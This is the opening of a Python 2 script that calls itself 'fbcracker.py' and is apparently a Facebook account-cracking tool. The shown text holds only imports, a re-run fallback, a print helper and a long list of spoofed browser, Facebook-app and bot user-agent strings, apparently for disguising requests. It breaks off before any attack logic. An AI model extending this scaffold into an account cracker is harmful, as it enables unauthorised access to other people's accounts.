#!/usr/bin/python2
# -*- coding: utf-8

#AUTHOR : MR OKWUDIRE (D.Shadow)
#OPEN SOURCE :)
#No Need For Your Credit


try:
	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("python2 fbcracker.py")

from os import system
from time import sleep

def xox(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
      

agents = [
		"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
		 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
 	 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
  		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
  "Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
  "MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
